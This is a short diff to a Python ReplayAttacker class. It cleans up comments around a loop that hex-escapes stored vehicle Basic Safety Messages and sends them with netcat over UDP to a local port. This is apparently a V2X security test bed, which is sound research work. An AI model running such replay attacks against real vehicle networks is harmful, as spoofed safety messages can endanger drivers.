@@ -44,15 +44,14 @@ class ReplayAttacker:
     def replay(self):
         print("Replaying BSMs!")
         for bsm in self.storedBSMs:
-            # BSM = bsm.hex()
-            # BSM = "\\x" + "\\x".join(BSM[i:i+2] for i in range(0, len(BSM), 2))
+            
             bsm = bsm[82:]
-            #bsm = bsm[2:len(bsm) - 2]
+            
             bsm = "\\x" + "\\x".join(bsm[i:i + 2] for i in range(0, len(bsm), 2))
-            # print("replay:\t" + bsm)
 
-            # print("Replaying BSM")
+            print("Replaying BSM")
+            
             loader = subprocess.Popen(("echo", "-n", "-e", bsm), stdout=subprocess.PIPE)
             sender = subprocess.check_output(("nc", "-w0", "-u", "localhost", "52001"), stdin=loader.stdout)
-            # print("Replay sent!")
+            
             time.sleep(0.1)
